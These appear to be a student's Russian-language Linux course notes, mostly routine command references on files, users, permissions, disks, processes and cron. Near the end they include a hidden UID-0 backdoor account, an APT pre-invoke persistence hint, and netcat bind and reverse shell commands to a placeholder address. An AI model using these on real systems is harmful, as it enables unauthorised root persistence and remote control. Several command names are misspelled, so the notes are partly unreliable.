getent passwd - выведет содержание файла

clear очистит экран

su root - переключение на пользователя root
su Пользователь - переключение на указанного пользователя

Добавление пользователю прав суперпользователя необходимо:
1. Перейти в пользователя root: su root
2. Установить утилиту sudo: apt install sudo
3. Добавить пользователя в группу root: /sbin/adduser egor sudo

Если ввести команду sudo ls -l в пользователе с правами root (пользователь не root), то система попросит ввести пароль пользователя (пароль не root)

sudo swapon --show показать файл подкачки

Убить процесс sudo kill -9 pid процесса

Открытие еще одного окна командной строки прав Ctrl+F2, переход к предыдущему прав Ctrl+F1

cd - возвращает в предыдущую папку

ls -R покажет что все файлы и папке в домашней деректории

ls -l показывает файлы в длинном формате, в том числе покажет итого сколько занято блоков памяти

ls -a показывает все скрытые файлы и папки (все, что начинается с . является скрытым файлом, а все что подсвечено является скрытой директорией)

ls -al покажет все скрытые файлы и директории в длинном формает

ls -am выводит файлы и директории через запятую

ls -ax выводит файлы и директории в алфавитном формате

ls -s выводит информацию о занятых блоках

which mc покажет директорию, в которой установлено приложение

whereis mc покажет все директории, в которые программа установила свои файлы

ls /etc > etc.txt созадст файл в текущей директории и запишет в него содержание папки etc

ls -al >> etc.txt допишет содержание текущей директории в коней файла etc.txt

ls -al > etc.txt перезапишет файл etc.txt информацией о содержании текущей директории

mv test /home/egor/ перемещает файл test в директорию egor

mv test newtest переименует файл test в newtest

cp -R skillbox/ /home/egor/newdir/ скопирует директорию skillbox в newdir сохраняя всю структуру и содержание

ls -a /etc >bigfile запишем содержание директории etc в файл bigfile

ls - a /dev >>bigfile

more bigfile выведет содержание файла страницами

less bigfile выведет содержание файла страницами с функциями поиска в файле

head bigfile выводит 10 первых строй из файла

head -50 bigfile выводит 50 первых строк из файла

tail -20 bigfile выводит последние 20 строк из файла

split -b5k bigfile big. разбивка файла bigfile размерами по 5 кб с названием big.aa, big.ab, big.ac и т.д.

cat big.* >restoredbigfile соединит все файлы big.* с названием big в файл restoredbigfile

diff bigfile restoredbigfile сравнивает 2 файла

find выводит все, что находится в папке

find ./skillbox/ выводит содержание директории skillbox

find . -name 'big*' выведет файлы с именем начинающейся с big

find . -not -name 'big*' выведет файлы с именем не содержащих big

find . -maxdepth 1 -name '*.a*' выведет файлы с содержанием буквы а в расширении файла только в текущей директории

find ./skillbox/ ./newdir/ -type f -name 'err' выведет из папок skillbox и newdir все файлы с именем err

grep Egor /etc/passwd будет искать слово Egor в файле passwd

grep -i "Egor" /etc/passwd будет искать слово Egor в файле passwd не учитывая регистр

grep -v egor /etc/passwd будет искать в файле passwd все кроме egor

grep -r err /home/egor найдет все файлы, в которых есть err в содержании (не в имени файла)

grep -r -с err /home/egor найдет и выведет все файлы, в которых есть err в содержании и с количеством повторений

grep --color root /etc/passwd выведет и подсветит слово root из файла passwd

ls -a /etc | grep host выведет все файлы из etc в названия которых есть host

egrep -w "bin|bash" bigfile выведет файлы с названием bin или bash

grep -i sh bigfile | wc -l выведет количество повторений слова sh в файле bigfile

ls -l /dev/tty[0-23] выведет список устройств с номерами от 0 до 23

who am i выведет информацию о номере консоли, в которой сейчас рабатаю

echo "Hello!" > /dev/tty1 выведет сообщение Hello! в консоль tty1

cat /etc/hosts >/dev/tty2 выведет содержание файла hosts в консоль tty2

dd позваляет читать заданное число блоков из файла

od вывод дампа файла в разных форматах

dd if=/dev/zero bs=512 count=500 | od -c выведет из файла zero размером 512 байт с количеством 500 в структурированной формате с помощью команды od -c

df -h покажет информацию о дисках

lsblk покажет подробную информацию о дисках в виде дерева

ls -l /dev/ | grep sda выводит информацию о дисках (количество дисков и права доступа для них)

sudo fdisk -l запустить утилиту fdisk можно с помощью команды

df -T выведет все диски подмонтированные в системе

sudo apt install parted установка утилиты для работы с дисками

sudo parted /dev/sdb запуск утилиту parted для диска sdb (для флэшки usb)

В утилите parted: команда print выведет информацию о флэшке

В утилите parted: mklabel msdos создаст метку msdos для флэшки. Т.к. поменяли метку флэшки, информации о размере диски не будет отображаться

В утилите parted: mkpart создаем раздел. Необходимо указать тип раздела. Необходим указать начало форматирвоания 0% и конец форматирование -1s.

В утилите parted: quit выход из утилиты.

sudo mkfs.ext4 /dev/sdb1 форматирование раздела в системе ext4

sudo mount /dev/sdb1 /mnt примонтируем флешку в системе

sudo umount /dev/sdb1 отмонтируем флешку

sudo badblocks -v /dev/sdb1 >bad.txt выводит в файл bad.txt информацию о битых секоторах флешки с подробным описанием (наличие -v)

sudo e2fscl -l bad.txt /dev/sdb1 после команды badbloks необходимо системе сообщить, чтобы битые сектора записанные в bad.txt не нужно использовать для записи. Параметр -l говорит утилите, чтобы она использовала список битых секторов из файла.

sudo apt install smartmontools установка утилиты для проверки дисков

sudo smartctl -H /dev/sdb1 запуск диагностики диска

sudo fsck -M -c -y /dev/sdb1 запускаем утилиту диагностики (-M исключить из проверки диски, которые смонтированы в системе; -с чтобы увитедеть детали проверки; -y чтобы сразу исправлялись ошибки)

lesson 7
sudo apt install sleuthkit установка утилиты для анализа данных

sudo fsstat /dev/sda1 |more выведем информацию о блоках нашего диска

sudo fsstat /dev/mapper/skillbox--vg-root |more 

ls -li bad.txt выведет информацию о inode принадлижащих файлу bad.txt. Покажет номер индексного дискриптера.

stat bad.txt выведет подробную информацию о файле

sudo apt insrall ext4magic установим пакет для восстановления данных

Можно одновременно копировать несколько файлов sudo cp test10 test20 /mnt

sudo init 3 перед восстановлением файлов выполним команду. Переход в режим 3, т.е. режим без оболочки. Т.к. чаще всего графические оболочки обращаются к диску и вносят изменения

sudo /sbin/debugfs -R "dump <8> /home/egor/sdb1.journal" /dev/sdb1 делаем копию журнала файловой системы

date -d "-10minutes" +%s посмотреть метку времени 1751917375

sudo ext4magic /dev/sdb1 -H -a 1751917375 |more

Метка времени помечается *******. Нужно брать предыдущую метку времени 1751917736

sudo ext4msgic /dev/sdb1 -a 1751917736 -f / -l выведет на сколько пострадали файлы при удалении. Если имена файлов не выводит, занчит связь с ними потеряна.

sudo ext4magic /dev/sdb1 -a 1751917736 -f / -j sdb1.journal -r восстановление удаленный файлов по метке времени из журнала


sudo cat RECOVEREDIR/test10 попробудем найти удаленные файлы в папке RECOVEREDIR
*********************************************************************************************************************************************
---------------------------------------------------------------------------------------------------------------------------------------------
hostname - выведет название машины
uname -v - выведет имя дистрибутива и версия ядра 
cat /etc/passwd - выведет список пользователей

Автоматизируем процесс и созданим файл nano добавим скирпт recon.sh

chmod +x recon.sh - назначим специальные права файлу на запуск

cd ../usb - выйдет на папку выше и перейдет в папку usb, которая находится в папке выше

ls --help - выведет справочную информацию о комнаде ls

man ls - также выведет справочную информацию о команде ls

ls -l - выведет файлы с информацией о правах доступа, типе файлов и размере

realpsth имя_файла/директории - выведет абсолютный пусть к файлу

file имя_файла - покажет тип данных, которые содержатся в файле

file имя_файла1 имя_файла2 имя_файла3 - покажет тип данных, которые содержатся в файлах

file -z - позволяет заглянуть в архив без его открытия

stat опции имя_файла - выводит информацию о файле (файловой системы, символических ссылках на которые они указывают, инофрмацию о блоках, размер файла, номер inoda, имя владельца, группы, дата создания, изменения и т.д.)

stat -t имя_файла - выводит информацию в одну строку

stat -f имя_файла - выводит информацию о файловой системе, inode и т.д.

ln -s test20 symlink_test - создание мягкой ссылки с именем symlink_test на файл test20

ln test20 hardlink_test20 - создание жесткой ссылки hardlink_test20 на test20

sudo find / -name ".bashrc" - найдет файлы с указанным именем

sudo find / -name "*.deb" - найдет файлы с указанным расширением

sudo find / -name "sample_* -a -name "*hpp" - найдет все файлы начинающиеся с sample_ и заканчивающиеся на hpp

sudo find . ! -name "*.log" - найдет все файлы расширение которых отличается от log

sudo find . -type f -mtime +5 - найдет все файлы которые были изменены более 5 дней назад

sudo find . -type f -newermt "2025-07-13 21:00" - найдет файлы измененные в указанное время

sudo find . -type f -newermt 2025-07-13 ! -newermt 2025-07-13 - найдет файлы измененые в указанный диапазон времени

sudo find . -type f -newerat 2025-07-13 - найдет все файлы, к которым обращались в указанную дату

sudo find . -type -newerct 2025-07-12 - найдет все файлы созданые от указанной даты 

sudo find /opt -size +50M - найдет все файлы размером более 50 мб

ls -lh ... - выведет файлы с указанием размера в мб

find -size +50M -size -100M - найдет все файлы размером от 50 до 100 мб

locate .bashrc - найдет файлы с указанным именем

locate *.md - найдет все файлы заканчивающие на md

locate -n 5 *.md - найдет первые 5 файлов заканчивающие на md

locate -c *.md - выведет количество файлов заканчивающих на md

locate -e *.md - найдет только существующие файлы заканчивающиеся на md

locatr --regex -i "(\.log|\.json)" - найдет все файлы log и json независимо от регистра

which gebit - команда покажет положение исполняемого бинарного файла

which netcat uptime - команда покажет положения исполняемых бинарных файлов

which -a touch - покажет оба положения файла
---------------------------------------------------------------------------------------------------------------------------------------------
sudo adduser skillbox - создаст юзера skillbox со всеми настройками
Проверить созданного пользователя можно с помощью команды cat /etc/passwd. Будет выведен список пользователей и вновь созданный будет внизу списка. Также можно проверить домашнюю директорию с помощью sudo ls -la /home/skillbox.

sudo passwd -S skillbox выведет 7 полей пользователя (1 - имя пользователя; 2 - заблокирована ли учетная запись, с паролем она или без; 3 - дата последнего изменения пароля; в остальных 4 хранится минимальный и максимальный срок действия пароля, период предупреждения о смене пароля и период неактивности пароля, все сроки измеряются в днях)

sudo passwd skillbox - смена пароля пользователя skillbox

sudo chage -l skillbox - выведет различные параметры безопасности пароля пользователе. При необходимости можем их изменить с помощью соответствующих ключей.

ls -l /home - покажет содержание директории home, в которой храняться папки пользователей системы

su -c 'ls -l ~/' skillbox - позволяет посмотреть содержание каталога пользователя skillbox без перехода к этому пользователю

sudo ls -la / - просмотр содержания корня. Разрешена пользователям, которые добавлены в файл sudoers.

sudo mcedit /etc/sudoers - откроет файле sudoers для добавления пользователя. Разрешено открытие файла, только пользователям с правами root.

sudo chown skillbox test_dir/ - изменит владельца папки test_dir на пользоваетеля skillbox

sudo chown -R skillbox test_dir/ - изменит владельца папки test_dir и всего содержимого в ней на пользоваетеля skillbox.

Для работы с ACL его необходимо установить с помощью команды sudo apt update && sudo apt install -y acl.

getfacl skillbox - выведет ACL для файла skillbox

setfacl -m u:skillbox:rw ./new_recon.sh - устанавливаем пользователю skillbox права на запись и чтение для файла new_recon.sh

umask - выведет информацию о пользовательской маски, которая используется для определения конечных прав доступа. По умолчанию 022. Т.е. при создании файлов, они создаются 666-022=644, а папку 777-022=755.

umask 027 - изменит пользовательскую маску. Соответственно будет: для файлов 666-027=640, для папок 777-027=750
---------------------------------------------------------------------------------------------------------------------------------------------
cat /etc/passwd - выведет информацию о пользователях в системе

sudo cat /etc/shadow - выведет информацию о паролях пользователей, но не сами пароли

cat /etc/group - выведет информацию о группах в системе

groups или groups пользователь - выведет группы, в которых состоит текущий пользователь. Первая группа является основной

sudo chmod g-x new_recon.sh - уберет возможность запуска на выполение для групп файла new_recon.sh

sudo chmod ugo+x newtest - добавим права на выполенение файла newtest user group other (всем пользователям)

sudo chmod -R 744 dir4 - уберем возможность выполнения из папки dir4 и вложенных файлов для групп

mkdir -m 755 dir4/dir5 - создадим папку с разрешением для выполнения в папке dir4 (в папке dir4 другие файлы не имеют возможности для запуска)

su - перейдет на пользователя root
su egor - перейдет на пользователя egor

sudo cat /etc/sudoers - в файле sudoers содержатся пользователи, которые могут использовать команду sudo

Перед просмотром файла журнала auth.log, необходимо установить sudo apt-get install rsyslog.
sudo cat /var/log/auth.log - выведет содержание файла журнала

sudo su - - переключится на пользователя root без запроса пароля

sudo bash - позволяет выполнять в рамках домашней директории с правами root


uname -a - выведет версию ядра

cat /etc/*-release - выведет информацию о дистрибутиве
---------------------------------------------------------------------------------------------------------------------------------------------
Если с командой sudo использовать флаг -i, тогда потребудется ввести пароль только один раз

useradd mytest - создаст пользователя mytest
passwd mytest - зададим пароль пользователю

usermod -l pupkov pupkin - изменим имя пользователя с pupkin на pupkov. Если необходимо у пользователя поменять uid, тогда вместо -l используем -u.
userdel mytest - удалит пользователя. Для того, чтобы выполнить удаление также папок и почты пользователя необходимо использовать флаг -r.
sudo killall -u mytest - остановит все процессы запущенные пользователем mytest
userdel -f mytest - принудительно удалить пользователя, даже если он в данное время находится в системе и от его имени запущенны процессы.

groupadd test - добавит группу test
groupmod -n testy tests - изменит название группы с tests на testy.
groupdel testy - удалит группу testy. Удаляет не только группу, но и файлы.

chown -R lisa /home/account - меняет владельца каталога account и всех вложенных в него файлов (наличие флага R)/
chgrp .sales /home/account - меняет владельца каталога account на группу sales (если необходимо изменения вложенных файлов, также можно использовать флаг -R)

Установка разрешения на чтение (4-read), запись (2-write), выполнение (1-execute). Т.е. Если выполнить команду абсолютного изменения разрешений chmod 755 /somefile - на файл somefile будет установлено: для владельца - чтение, запись и выполнение (4+3+1), для группы - чтение и выполнение (4+1), для всех остальных - чтение и выполенине (4+1). Команда chmod +x somefile - выполнится относительное добавление разрешений, т.е. все пользователям добавится разрешение на выполнение.

sudo vi /etc/ssh/ssh_config - открывает файл настроек для подключения по ssh в редакторе vi

sudo usermod -a -G editorsgroup pingvinus - добавим пользователя pingvinus в группу editorsgroup

sudo gpasswd -d pingvinus editorsgroup - Удалим пользователя pingvinus из группы editorsgroup

echo $SHELL, echo $0, ps -p $$ - выведет информацию об используемой оболочке в системе
cat /etc/shells - в файле содержится информация о все установленных оболочках в системе
chsh -s путь_новой_оболочки - изменение оболочки на постоянной основе (например chsh -s /bin/sh). Чтобы переключиться временно, необходимо ввести имя оболочки.
chsh -s /bin/sh yuriy - изменение оболочки на постоянной основе для определенного пользователся
sudo apt install fish - установка дополнительной оболочки, в данном случае fish
---------------------------------------------------------------------------------------------------------------------------------------------
head test.php - выведет по умолчанию первые 10 строк. Можно ввести количество строк для вывода. Для этого нужно ввести head -n 2 test.php
tail test.php - выведет по умолчанию последние 10 строк. Для вывода заданного числа строк нужно добавить флаг tail -n 2 test.php. Если добавить ключ -f, тогда команда будет отслеживать изменения в файле и выводить.

more test.php - выведет содержание файла объемом 1 страница. Для оставшегося объема нужно нажать пробел.
less test.php - выведет содержание файла объемом 1 страница. Для оставшегося объема нужно нажать пробел. В конце файла выведется слово END. Для вывода нужно нажать клавишу q.
echo 'one two three' | awk '{print $1}' - выведет one. Указанная команда создает поток с помощью команды echo, и затем команда awk выведет из этого потока указанное слово. Если написать echo 'one two three' | awk '{print $2}', то выведет слово two.
echo 'one two three four five' | awk '{print $3,$1}' - выведет из потока three one.
echo 'one two three four five' | awk '{print "test:",$3,$1}' - выведет test: three one
echo 'one lala:two lala:three' | awk -F":" '{print $1}' - выведет до разделителя : one lala. Ключ -F показывает, что разделитель не стандартный. Если -F не указывается, то команда берет разделитель пробел по умолчанию.
echo 'one lala:two lala:three' | awk -F"lala:" '{print $1}' - выведет до разделителя lala: one
echo 'one two three four five' | awk '{print $NF}' - выведет последнее слово в потоке five
echo 'one two three four five' | awk '{print $(NF-1)}' - выведет предпоследнее слово в потоке four
sort test.php - выведет отсортированный текст файла. Само содержимое файла не затронуто.
sort -r test.php - выведет отсортированный текст в обратном порядке

grep egor /etc/passwd - в файле passwd найдет пользователя egor и выведет его egor:x:1000:1000:egor,,,:/home/egor:/usr/bin/zsh
grep -i "EGOR" /etc/passwd - в файле passwd найдет пользователя egor без учета регистра
grep -A4 "it`s me" test.php - найдет в файле test.php искомую строку "it`s me" и выведет ее на экран
grep -с "hello" test.php - выведет сколько раз встречается слово в файле
grep -n "it's me" test.php - выведет номер строки и саму строку, в которой встречается указанное в кавычках слово
grep -l "hello" *.php - укажет файл, в котором встречается слово
---------------------------------------------------------------------------------------------------------------------------------------------
uname -r - выведет версию ядра 6.12.25-amd64
sudo grub-set-default 1 - установит загрузку по умолчанию 1 версию ядра

sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward' - запишем в фалй настройки сети ядра значение 1. Будет действовать до перезагрузки
sudo sysctl net.ipv4.ip_forward=1 - присваеваем указанной переменной значение. Результат net.ipv4.ip_forward = 1. Будет действовать до перезагрузки
sudo sysctl -w net.ipv4.ip_forward=1 - присваеваем указанной переменной значение. Результат net.ipv4.ip_forward = 1. Будет действовать постоянно, т.к. указан флаг -w
sudo sysctl -a - выведет список всех доступных переменных
hostnamectl set-hostname sabina - установить имя машины. Требует подтверждение паролем.

sudo apt install grub-customizer - установка настрощика загрузщика.
grub-customizer - запуск настройщика загрущика. Настройки загрущика хранятся в /etc/default/grup в файле grup.config

gdisk - выведет информацию о типе загрузочного диска. В нашем случае GPT fdisk (gdisk) version 1.0.10 
---------------------------------------------------------------------------------------------------------------------------------------------
pidof init - выведет идентификатор процесса init. Он всегда равен 1, т.к. запускается самим ядром. Можно узнать PID и других процессов
ps - выведет запущенные в настоящее время процессы
ps -d - выведет все процессы, в том числе фоновые
ps -f - выведет информацию о запущенных процессах (UID- пользователь, который их запустил; PID- номер процесса; PPID - номер родителя, который запустил процесс; C - загрузка CPU процессом; STIME - время начала выполенения процесса; TTY - тип терминала, который связан с процессом; TIME - количество процессорного времени затраченного на выполенение процесса; CMD - команда, которая запустила процесс и т.д.)
ps -f 20313 - выведет информацию о процессе с PID 20313
pgrep -f zsh - выведет идентификационный номер процесса zsh

jobs &firefox - запуск из терминала программу firefox. Для выхода в терминале из конманды jobs, нужно нажать ctrl+z
jobs -l - покажет все остановленные и выполняемые в фоновом режиме в рамках текущей сессии данного терминала программ
fg - вернуть программу из фонового режим на передний план. Если в фоновом режиме выполняется несколько задач, то нужно указать номер выполняемой задачи
bg - перевод программы в фоновый режим. Теперь если закрыть терминал, тогда закроится и фоновый процесс.

ps -aux --sort=%cpu - выведет список процессов с сортировкой по потреблению ресурсов (по возрастанию)
top - выведет таблицу процессов в реальном времени
top -i - выведет процессы, которые используют ресурсы процессора
Утилита glances инструмент с расширенными функциями мониторинга системы. Ее нужно установить с помощью sudo apt-get update, sudo apt-get install glances.
glances - выведет список процессов

ps aux |grep ping - выведет идентификатора процесса ping.
kill 97805 - остановит процесс с указанным PID
kill -KILL 97805 - остановит процес с указанным PID. Лучще %ввыфвфывиспользовать с -KILL.
pkill ping - останавливает процесс по имени процесса
killall ping - остановит все процессы связанные с процессом (в нашем случае с ping)
kill -l сигнал - можно послать процессу специальные сигналы. Для этого процесс должен понимать сигнал

sudo apt-get install htop - установка утилиты для отображения всех процессов системы. 
nice -n 10 top - устанавливаем  процессу top приоритет 10. Чем меньше цифра, тем больше приоритет. Можно ставить также отрицательные значения, это еще выше приоритет, но отрицательные значения может ставить только root.
sudo renice -n 0 119698 - меняет приоритет процессу 119698 на 0.

w - выведет информацию о пользователе (USER), терминале (TTY), имя хоста или IP адрес (FROM), время, когда учетная запись вошла в систему (LOGIN@), время, когда польователь проявил активность с определенного аккуанта (IDLE), время использованное процессами запущенными в данном теримнали (JCPU), время использованное текущим процессом (PCPU) текущий процесс и команда, которыми занят пользователем под конкретной учетоной записью (WHAT)
w -h - выведет информацию о пользователе, терминале и т.д. без заголовков столбцов
sudo w -u  - выведет дополнительные параметры
w - s - также выведет информацию о пользователе

free - отобразит информацию о свободной и занятой памяти
free -h - отобразит информацию о свободной и занятой памяти в более читаемом виде
vmstat - показывает отчёт об использовании памяти: сообщает информацию о процессах, задействованной и свободной памяти, подкачке, блочном вводе-выводе, дисках и активности процессора

sudo apt-get install bum - установка программы-конфигуратора для редактирования конфига уровня запуска системы. 
• Runlevel 0 — завершает работу системы
• Runlevel 1 — однопользовательский режим
• Runlevel 2 — многопользовательский режим без сети
• Runlevel 3 — многопользовательский режим с сетью
• Runlevel 4 — не используется
• Runlevel 5 — аналог 3-го уровня, но с поддержкой графического интерфейса
• Runlevel 6 — перезагрузка системы

runlevel - выведет информацию об уровне системы. Выводится в формате N M - N-предыдущий уровень, M-текущий. Если в место цифры отобразается N, значит система была сразу запущена под уровнем M.

systemctl cat nginx.service - выведет файл юнита
sudo systemctl edit --full nginx.service - команда для редактирования файл юнита
sudo apt-get install chkservice - установка графической оболочки для работы с юнитами systemd

sudo useradd -o -u 0 -g 0 -s /bin/bash deamon - создаст пользователя с не уникальними UID, создали нового root с UID равным 0,  для которго нет домашнего каталога

touch cmd - создадим файл
В файл запишем APT::Update::Pre-invoka{"CMD"}
-------------------------------------------------------------------------------------------------------------------------------------------
lspci - команда выведет подключенные к PCI-устройства. В 1 колонке - адрес устройства; 2 - тип устройства; 3 - производитель и описание
lspci | grep audio - выведет информцию о аудиокарте
lspci | grep VGA - выведет информацию о видеокарте
lspci -s 00:02.0 - выведет устройство на 2 слоте
lspci -v - выведет подробную информаци об устройстве
lspci -vv - выведет информацию о драйвере устройсва в ядер
lspci -vv | grep Kernel - выведет информацию о драйвере устройсва в ядер с фильтром по Kernel
lsusb - выведет информацию об устройствах подключенных к USB
lsusb --verbose - выведет подробную информацию об устройствах подключенных к USB
sudo apt install lsscsi - установим утилиту для вывода информации об устройствах подключенных к scsi
lsscsi - выведет информацию о подключенных устройствах к scsi
lscpu - выведет информацию о cpu
sudo apt install lshw - установим утилиту для вывода подробной информации по каждому устройству в терминале
lshw - выведет подробную информацию по каждому устройству в терминале
lshw | grep \* - выведет информацию о классах устройств
lshw -class display - выведет информацию о дисплее
lshw -class network - выведет информацию о сетевой плате

lsmod - покажет все модули загруженные в ядре
cat /proc/modules - выведет информацию по загружаемых модулях в ядре
modinfo fuse - выведет информацию о файле модуля
modprobe vboxsf - запустим модуль vboxsf
sudo insmode - также запускает моудли, но тут нужно передавать полностью пусть до модуля
sudo modprobe -r - удалит модуль
sudo rmmod - также удалит модуль

sudo apt install util-linux-extra - установить пакет для использования sudo hwclock -r
sudo hwclock -r - выведет системное вермя и дату
sudo date --set "August 02 22:03:40 2025" - установить текущее время и дату

crontab -e - открывается временный файл для редактирования (добавления задач) в планировщик текущего пользователя
Шаблон задания в cron: Минуты(0-59) Часы(0-24) День(1-31) Месяц(1-12) День недели(0-6) Команда
crontab -l - выведет планировщик для текущего пользователя
crontab -r - удалить все существующие задачи
crontab -u имя пользователя - открывается временный файл для редактирования (добавления задач) в планировщик для другого пользователя (например crontab -u egor -e)
sudo echo ALL >> /etc/cron.deny - запрещаем всем менять таблицу crontab
sudo echo egor >> /etc/cron.allow - разрешаем пользователю менять таблицу crontab (приоритет у файла cron.allow)

sudo apt install at - установим утилиту at для одноразовых заданий
echo "updatedb" | at -m 9pm - запланировали на 9 часов после полудня выполнить updatedb
at -f my_scrypt.sh 8:00 am - запланируем одноразовое выполнения скрипта в файле my_scrypt.sh в 8 часов до полудня

netcat -l -e "/bin/bash" -p - создание прямого бекдора, т.к. входящего
netcat -e "bin/bash" [ip][port] - создание обратного бекдора, т.к. исходящего
